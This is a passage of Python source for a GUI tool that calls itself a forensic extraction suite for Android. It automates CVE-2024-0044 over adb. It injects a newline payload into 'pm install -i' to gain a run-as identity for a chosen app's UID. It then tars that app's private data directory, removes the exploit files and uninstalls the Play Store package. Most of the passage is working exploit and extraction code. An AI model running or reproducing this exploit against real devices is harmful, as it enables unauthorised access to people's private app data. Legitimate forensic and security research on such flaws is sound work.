       package = self.selected_package.get()
       if not package:
           messagebox.showwarning("No App Selected", "Please select an application first")
           return
       
       # Clear log buffer for new extraction
       self.log_buffer = []
       
       # Clear log display
       self.log_text.config(state=tk.NORMAL)
       self.log_text.delete(1.0, tk.END)
       self.log_text.config(state=tk.DISABLED)
       
       # Run in thread
       thread = threading.Thread(target=self.run_extraction, args=(package,))
       thread.daemon = True
       thread.start()
   
   def run_extraction(self, package):
       """Run complete forensic extraction process - ISO/IEC 27037:2012 compliant"""
       try:
           self.start_btn.config(state=tk.DISABLED, bg=self.bg_input)
           
           # Create output directory with forensic naming
           timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
           package_clean = package.replace('.', '_')
           self.extraction_dir = f"extraction_{package_clean}_{timestamp}"
           os.makedirs(self.extraction_dir, exist_ok=True)
           
           self.write_log("="*70, "INFO")
           self.write_log("TRAVERSO FORENSICS - PROFESSIONAL EXTRACTION Suite v1.0", "SUCCESS")
           self.write_log("="*70, "INFO")
           self.write_log(f"Standard: ISO/IEC 27037:2012", "INFO")
           self.write_log(f"Exploit: CVE-2024-0044 (Payload Injection Method)", "INFO")
           self.write_log(f"Target Package: {package}", "INFO")
           self.write_log(f"Output Directory: {self.extraction_dir}", "INFO")
           self.write_log(f"Extraction Time: {datetime.now().isoformat()}", "INFO")
           self.write_log("="*70, "INFO")
           
           # Initialize verifier
           self.verifier = ForensicVerification(log_callback=self.write_log)
           
           # PHASE 1: PRE-EXTRACTION VERIFICATION
           self.update_progress(1, 10, "Phase 1/4: Pre-extraction verification...")
           self.write_log("\n▶ PHASE 1: PRE-EXTRACTION VERIFICATION", "INFO")
           
           if not self.verifier.run_pre_verification(package):
               messagebox.showerror("Verification Failed", "Pre-extraction checks failed. See log for details.")
               self.save_log_to_file(self.extraction_dir)
               return
           
           # PHASE 2: CVE-2024-0044 EXPLOITATION (PAYLOAD INJECTION METHOD)
           self.update_progress(2, 10, "Phase 2/4: CVE-2024-0044 exploitation...")
           self.write_log("\n▶ PHASE 2: CVE-2024-0044 EXPLOITATION (PAYLOAD INJECTION)", "INFO")
           self.write_log("Method: pm install -i with malformed installer package", "INFO")
           
           # Get UID of target package
           self.write_log(f"Getting UID for {package}...", "INFO")
           uid = self.get_package_uid(package)
           
           if not uid:
               self.write_log("Failed to get package UID - using fallback method", "WARNING")
               uid = self.selected_uid.get()
               if not uid or uid == "None":
                   messagebox.showerror("Error", 
                       f"Could not determine UID for {package}\n\n"
                       f"Please ensure the package is installed and try again.")
                   self.save_log_to_file(self.extraction_dir)
                   return
           
           self.write_log(f"Target UID: {uid}", "SUCCESS")
           
           # Find traverso.apk
           self.write_log("Locating exploit APK...", "INFO")
           apk_path = "traverso.apk"
           if not os.path.exists(apk_path):
               # Try subdirectories
               for root, dirs, files in os.walk("."):
                   if "traverso.apk" in files:
                       apk_path = os.path.join(root, "traverso.apk")
                       break
           
           if not os.path.exists(apk_path):
               self.write_log("traverso.apk not found", "ERROR")
               messagebox.showerror("Error", 
                   "traverso.apk not found in current directory\n\n"
                   "Please ensure traverso.apk is in the same folder as this application")
               self.save_log_to_file(self.extraction_dir)
               return
           
           self.write_log(f"Found APK: {apk_path}", "SUCCESS")
           
           # Push APK to device
           self.update_progress(3, 10, "Pushing exploit APK...")
           self.write_log("Pushing exploit APK to device...", "INFO")
           
           result = subprocess.run(
               ["adb", "push", apk_path, "/data/local/tmp/traverso.apk"],
               capture_output=True, text=True, timeout=30
           )
           if result.returncode != 0:
               self.write_log(f"Failed to push APK: {result.stderr}", "ERROR")
               self.save_log_to_file(self.extraction_dir)
               return
           
           self.write_log("APK pushed successfully", "SUCCESS")
           
           # Execute exploit with payload injection
           self.update_progress(4, 10, "Executing payload injection exploit...")
           self.write_log("Executing CVE-2024-0044 exploit (Payload Injection)...", "INFO")
           
           # Create payload with actual UID
           payload = f"""@null
victim {uid} 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null"""
           
           self.write_log(f"Payload created with UID: {uid}", "INFO")
           
           # Execute pm install with -i flag (THE ACTUAL EXPLOIT)
           install_cmd = f"""PAYLOAD={shlex.quote(payload)}
pm install -i "$PAYLOAD" /data/local/tmp/traverso.apk"""
           
           self.write_log("Installing with malformed installer package...", "INFO")
           
           result = subprocess.run(
               ["adb", "shell", install_cmd],
               capture_output=True, text=True, timeout=60
           )
           
           if result.returncode != 0 and "already exists" not in result.stdout.lower():
               self.write_log(f"Install warning: {result.stderr}", "WARNING")
               self.write_log(f"Output: {result.stdout}", "INFO")
           else:
               self.write_log("Payload injection completed", "SUCCESS")
           
           # Verify exploit success
           self.update_progress(5, 10, "Verifying exploit success...")
           self.write_log("Verifying exploit...", "INFO")
           
           time.sleep(2)
           
           # Test access with run-as victim
           test_result = subprocess.run(
               ["adb", "shell", "run-as", "victim", "id"],
               capture_output=True, text=True, timeout=10
           )
           
           if test_result.returncode == 0 and "uid=" in test_result.stdout:
               self.write_log(f"Exploit SUCCESS - victim user created: {test_result.stdout.strip()}", "SUCCESS")
           else:
               self.write_log("Exploit verification inconclusive - proceeding with extraction", "WARNING")
           
           # Stream TAR directly using run-as victim
           self.update_progress(6, 10, "Extracting application data...")
           self.write_log("Streaming TAR archive from device...", "INFO")
           
           tar_filename = f"{package_clean}_backup.tar"
           output_file = os.path.join(self.extraction_dir, tar_filename)
           
           # Extract /data/data/{package}
           self.write_log(f"Extracting /data/data/{package}...", "INFO")
           
           # Use shell command to properly redirect stderr
           tar_shell_cmd = f"run-as victim tar -cf - /data/data/{package} 2>/dev/null"
           
           self.write_log(f"TAR command: adb shell {tar_shell_cmd}", "INFO")
           
           try:
               with open(output_file, 'wb') as tar_file:
                   process = subprocess.Popen(
                       ["adb", "shell", tar_shell_cmd],
                       stdout=tar_file,
                       stderr=subprocess.PIPE
                   )
                   
                   _, stderr = process.communicate(timeout=300)
                   code = process.returncode
               
               file_size = os.path.getsize(output_file)
               
               if file_size == 0:
                   self.write_log("TAR is EMPTY (0 bytes)", "ERROR")
                   self.write_log(f"stderr: {stderr.decode('utf-8', errors='replace') if stderr else 'No error output'}", "ERROR")
                   messagebox.showerror("Extraction Failed", 
                       "TAR file is EMPTY. Exploit failed to access package data.\n\n"
                       "Possible causes:\n"
                       "• Device security patch blocked exploit\n"
                       "• SELinux is blocking access\n"
                       "• Package has no accessible data\n\n"
                       "Check the log for details.")
                   self.save_log_to_file(self.extraction_dir)
                   return
               
               self.write_log(f"TAR extracted: {file_size} bytes ({file_size/1024/1024:.2f} MB)", "SUCCESS")
               
               # Verify minimum size - TAR header is 512 bytes, so 1024 means empty archive
               if file_size <= 1024:
                   self.write_log(f"⚠️  TAR file is EMPTY or only contains header ({file_size} bytes)", "ERROR")
                   self.write_log(f"stderr output: {stderr.decode('utf-8', errors='replace') if stderr else 'None'}", "ERROR")
                   
                   # Try alternative extraction methods
                   self.write_log("Attempting alternative extraction method...", "WARNING")
                   
                   # Try /data/user_de/0/{package}
                   self.write_log(f"Trying /data/user_de/0/{package}...", "INFO")
                   tar_shell_cmd_alt = f"run-as victim tar -cf - /data/user_de/0/{package} 2>/dev/null"
                   
                   with open(output_file, 'wb') as tar_file:
                       process = subprocess.Popen(
                           ["adb", "shell", tar_shell_cmd_alt],
                           stdout=tar_file,
                           stderr=subprocess.PIPE
                       )
                       _, stderr_alt = process.communicate(timeout=300)
                   
                   file_size_alt = os.path.getsize(output_file)
                   
                   if file_size_alt > 1024:
                       self.write_log(f"Alternative extraction successful: {file_size_alt} bytes", "SUCCESS")
                       file_size = file_size_alt
                   else:
                       self.write_log("Alternative extraction also failed", "ERROR")
                       messagebox.showerror("Extraction Failed",
                           f"Failed to extract data from both locations:\n"
                           f"• /data/data/{package}\n"
                           f"• /data/user_de/0/{package}\n\n"
                           f"Possible causes:\n"
                           f"• Exploit failed to grant access\n"
                           f"• Package has no data in these locations\n"
                           f"• SELinux is blocking access\n\n"
                           f"Check the log for stderr details.")
                       self.save_log_to_file(self.extraction_dir)
                       return
               
           except subprocess.TimeoutExpired:
               self.write_log("TAR extraction timeout (5 minutes)", "ERROR")
               messagebox.showerror("Timeout", 
                   "TAR extraction timed out after 5 minutes.\n\n"
                   "Possible causes:\n"
                   "• Very large application data\n"
                   "• Slow device or USB connection\n"
                   "• Device performance issues")
               self.save_log_to_file(self.extraction_dir)
               return
           except Exception as e:
               self.write_log(f"Exception during extraction: {e}", "ERROR")
               import traceback
               self.write_log(traceback.format_exc(), "ERROR")
               self.save_log_to_file(self.extraction_dir)
               return
           
           # Calculate SHA256 for forensic integrity
           self.update_progress(7, 10, "Calculating SHA256 hash...")
           self.write_log("Calculating SHA256 hash (Forensic Integrity)...", "INFO")
           
           hash_value = self.calculate_hash256(output_file)
           hash_path = os.path.join(self.extraction_dir, f"{package_clean}_backup_SHA256.txt")
           
           with open(hash_path, 'w', encoding='utf-8') as f:
               f.write("="*70 + "\n")
               f.write("TRAVERSO FORENSICS - INTEGRITY VERIFICATION\n")
               f.write("="*70 + "\n")
               f.write(f"File: {tar_filename}\n")
               f.write(f"SHA256: {hash_value}\n")
               f.write(f"Date: {datetime.now().isoformat()}\n")
               f.write(f"Package: {package}\n")
               f.write(f"UID: {uid}\n")
               f.write(f"Size: {file_size} bytes ({file_size/1024/1024:.2f} MB)\n")
               f.write(f"Standard: ISO/IEC 27037:2012\n")
               f.write("="*70 + "\n")
           
           self.write_log(f"SHA256: {hash_value}", "SUCCESS")
           self.write_log(f"Hash file saved: {hash_path}", "SUCCESS")
           
           # Cleanup device - Chain of Custody
           self.write_log("Cleaning up device (Chain of Custody)...", "INFO")
           
           # Remove APK
           cleanup_result = subprocess.run(
               ["adb", "shell", "rm", "-f", "/data/local/tmp/traverso.apk"],
               capture_output=True, timeout=10
           )
           if cleanup_result.returncode == 0:
               self.write_log("APK removed from device", "SUCCESS")
           else:
               self.write_log("APK cleanup - file may not exist", "INFO")
           
           # Remove any exploit scripts
           subprocess.run(
               ["adb", "shell", "rm", "-f", "/data/local/tmp/exploit*"],
               capture_output=True, timeout=10
           )
           
           # Uninstall victim app
           self.write_log("Uninstalling victim application...", "INFO")
           uninstall_result = subprocess.run(
               ["adb", "shell", "pm", "uninstall", "com.android.vending"],
               capture_output=True, text=True, timeout=30
           )
           if "Success" in uninstall_result.stdout:
               self.write_log("Victim app uninstalled successfully", "SUCCESS")
           else:
               self.write_log(f"Victim app uninstall status: {uninstall_result.stdout.strip()}", "INFO")
           
           # Generar reporte TXT con detalles específicos (Versión, Método, Fecha/Hora/Zona)
           self.generate_extraction_report(package, self.extraction_dir)
           
           # PHASE 3: SAVE FORENSIC LOG (Renumbered from 4)
           self.update_progress(9, 10, "Finalizing: Saving forensic log...")
           self.write_log("\n▶ PHASE 3: SAVING FORENSIC LOG", "INFO")
           log_file = self.save_log_to_file(self.extraction_dir)
           
           # COMPLETION
           self.update_progress(10, 10, "✅ Forensic extraction complete!")
           
           self.write_log("\n" + "="*70, "INFO")
           self.write_log("✅✅✅ FORENSIC EXTRACTION SUCCESSFUL!", "SUCCESS")
           self.write_log("="*70, "INFO")
           self.write_log(f"Standard: ISO/IEC 27037:2012", "INFO")
           self.write_log(f"📁 Location: {os.path.abspath(self.extraction_dir)}", "INFO")
           self.write_log(f"📄 TAR file: {tar_filename}", "INFO")
           self.write_log(f"🔐 SHA256: {hash_value[:32]}...", "INFO")
           self.write_log(f"📝 Log file: {os.path.basename(log_file) if log_file else 'Not saved'}", "INFO")
           self.write_log("="*70, "INFO")
           
           # List all generated files
           self.write_log("\n📂 Generated Files:", "SUCCESS")
           for filename in os.listdir(self.extraction_dir):
               filepath = os.path.join(self.extraction_dir, filename)
               size = os.path.getsize(filepath)
               self.write_log(f"   • {filename} ({size:,} bytes)", "INFO")
           
           # Update status
           self.status_label.config(text="Status: Extraction Complete ✅", foreground=self.accent_green)
           self.footer_progress_label.config(text=f"Data ready in: {os.path.basename(self.extraction_dir)}")
           
           self.last_extraction_dir = self.extraction_dir
           
           messagebox.showinfo("Extraction Complete",
                             f"✅ Forensic extraction successful!\n\n"
                             f"Standard: ISO/IEC 27037:2012\n"
                             f"📄 TAR: {tar_filename}\n"
                             f"🔐 SHA256: {hash_value[:32]}...\n"
                             f"📝 Log: extraction_log.txt\n"
                             f"📁 Location:\n{self.extraction_dir}\n\n"
                             f"⚠️  IMPORTANT:\n"
                             f"• Document in forensic report")
       
       except Exception as e:
           self.write_log(f"CRITICAL ERROR: {e}", "ERROR")
           import traceback
           self.write_log(traceback.format_exc(), "ERROR")
           
           # Save log even on error
           if self.extraction_dir:
               self.save_log_to_file(self.extraction_dir)
           
           messagebox.showerror("Error", f"Critical error:\n{e}\n\nCheck log for details.")
       
       finally:
           self.start_btn.config(state=tk.NORMAL, bg=self.accent_green)
           self.update_progress(0, 10, "")


def main():
   root = tk.Tk()
   app = TraversoForensicsGUI(root)
   root.mainloop()

if __name__ == "__main__":
   print("="*70)
   print("Traverso Forensics - Professional Extraction Suite v1.0")
   print("Standard: ISO/IEC 27037:2012")
   print("Exploit: CVE-2024-0044 (Payload Injection Method)")
   print("="*70)
   print("Starting application...")
   print()
   
   root = tk.Tk()
   app = TraversoForensicsGUI(root)
   root.mainloop()

